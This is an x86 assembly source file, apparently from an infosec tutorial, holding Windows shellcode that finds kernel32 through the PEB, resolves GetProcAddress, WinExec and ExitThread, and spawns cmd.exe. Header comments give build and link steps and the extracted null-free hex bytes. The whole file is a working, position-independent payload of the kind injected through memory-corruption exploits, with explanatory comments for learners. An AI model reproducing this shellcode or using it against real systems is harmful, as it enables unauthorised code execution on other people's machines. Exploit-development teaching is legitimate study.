;Full tutorial: https://www.zinzloun.info [#Windows CMD shellcode]

;COMPILE:
 ;nasm.exe [-f win32] dynamic.asm -o dynamic.obj
 ;SKIP -f win32 to create the .obj file to extract eventually the hex code
 ;then execute: [python bin2hex.py dynamic.obj] to get the hex code:

 ;"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08"
 ;"\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
 ;"\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74"
 ;"\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08"
 ;"\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c"
 ;"\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9"
 ;"\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49"
 ;"\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65"
 ;"\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d"
 ;"\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65"
 ;"\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9"
 ;"\x51\xff\xd6"

 ;you can download the python script here: https://github.com/zinzloun/infoSec/blob/master/bin2hex.py

;LINK
 ;GoLink.exe /console /entry _start dynamic.obj
 ;IF THE obj FILE IS NOT CREATED WITH THE -f win32 GoLink will COMPLAIN

 ;Tested and coded on Win10 Home edition 64, tested also on: Win7 EE 32, Win Srv 2012 R2 64

[BITS 32]

[SECTION .text]
global _start
_start:

;FIND Kernel32 BASE ADDRESS
xor ecx, ecx			; trick to avoid null byte MOV EAX,[FS:0x30], we add ecx
MOV EAX, [FS:ecx+0x30]  ; EAX = PEB
MOV EAX, [eax+0x0C] 	; EAX = PEB->Ldr
MOV EAX, [EAX+0x1C] 	; EAX = PEB->Ldr.InInitializationOrderModuleList.Flink
						; Start to move the pointer 2 positions ahead
mov eax, [eax+ecx]		;  EAX = LDR 2nd entry -> KernelBA * + ecx to avoid NULL
mov eax, [eax+ecx]		;  EAX = LDR 3rd entry -> Kernel32
						; End move
MOV EBX, [EAX+8]  		; EBX = LDR_MODULE's BaseAddress Kernel32

;Find the EXPORT TABLE of kernel32.dll
mov edx, [ebx + 0x3c] ; EDX = DOS->e_lfanew (offset 60)
add edx, ebx          ; EDX = PE Header (1)
mov edx, [edx + 0x78] ; EDX = Offset export table (offset 120)
add edx, ebx          ; EDX = Export table (data type IMAGE_EXPORT_DIRECTORY) (2), we will use this value later (*)
mov esi, [edx + 0x20] ; ESI = Relative offset to AddressOfNames
add esi, ebx          ; ESI = AddressOfNames (3)

;Find GetProcAddress function name (the ordinal)
Find_GetProc:
inc ecx                              ; Increment the counter (we start from 1)
									 ; lodsd instruction will follow the pointer specified by the ESI register and set result in the EAX, this means that after the lodsd
									 ; instruction we will have the offset of the current name function in EAX.
									 ; the instruction will also increment the esi register value with 4, so ESI will already point to next function name offset
lodsd
add eax, ebx                        ; Get function name (offset + base a)
cmp dword [eax], 0x50746547       	; PteG ->search first 4 bytes of the string GetProcAddre in little-endian format
jnz Find_GetProc
cmp dword [eax + 0x4], 0x41636f72 	; Acor ->other 4 bytes
jnz Find_GetProc
cmp dword [eax + 0x8], 0x65726464 	; erdd ->other 4 bytes. At this point even without checking the last 2 bytes (ss) of the function name we assume it is GetProcAddress
jnz Find_GetProc
dec ecx								; we start counting from 1 but the adrress index start from 0 so we need to decrement ECX
									; now ECX points to the array index of AddressOfNames and we can obtain the ordinal value in this way: AddressOfNameOrdinals[ecx] = ordinal

;Find the address of GetProcAddress function
mov esi, [edx + 0x24]    ; ESI = Offset to AddressOfNameOrdinals (4)(*)
add esi, ebx             ; ESI = AddressOfNameOrdinals
mov cx, [esi + ecx * 2]  ; CX (lower word of ECX 16bit) = AddressOfNameOrdinals contains two byte numbers value (the ordinal), so we only need of the lower word of ECX
						 ;  CX (16bit == 2byte). This value is the link (the index) to the AddressOfFunctions
						 ;  so CX now points to the Number of function (ordinal) that corresponds to the GetProcAddress address value in the AddressOfFunctions
mov esi, [edx + 0x1c]    ; ESI = Offset to AddressOfFunctions (5)
add esi, ebx             ; ESI = AddressOfFunctions
mov edx, [esi + ecx * 4] ; EDX = Offset to GetProcAddress function address: AddressOfFunctions[ecx*4]
						 ;	We set ecx * 4 because each address pointer has 4 bytes reserved and ESI points to the beginning of AddressOfFunctions array
add edx, ebx             ; EDX = GetProcAddress

;EDX WILL CHANGE AFTER THE CALL
mov esi, edx			 ; store GetProcAddress in ESI

;Finding address of Winexec calling GetProcAddress(base kernel32,"Winexec\0")
xor ecx,ecx
push ecx
;another trick to avoid null bytes: prefix the Winexec string with A to keep the stack aligned without null
;we load AWinexec
push 0x63657845
push 0x6e695741
mov ecx,esp
lea ecx, [ecx+1] ; get rid of 41(A)
push ecx	; Winexec\0
push ebx	; Base kernel32

call esi	;Call GetProcAddress: the return result is saved in EAX

xchg edi,edx
mov edi, eax;save Winexec address in EDI

;Finding address of ExitThread calling GetProcAddress(base kernel32,"ExitThread\0")
xor ecx,ecx
push ecx
;the same trick used before for WinExec
PUSH 0x64616572
PUSH 0x68547469
PUSH 0x78454141

mov ecx,esp
lea ecx, [ecx+2] ; get rid of 4141(AA)

push ecx	; ExitThread\0
push ebx	; Base kernel32

call esi	;Call GetProcAddress: the return result is saved in EAX
mov esi, eax;save ExitThread address in esi (overwrite GetProcAddress since we don't need anymore)

;Finally call cmd.exe\0
xor ecx,ecx
push ecx
push 0x20657865
push 0x2e646d63

mov ecx,esp	; "cmd.exe \0"
push 0x1 	; windows style
push ecx

call edi	; WinExec("cmd.exe \0",1)

;exit clean
xor ecx,ecx
push ecx
call esi 	; ExitThread(0)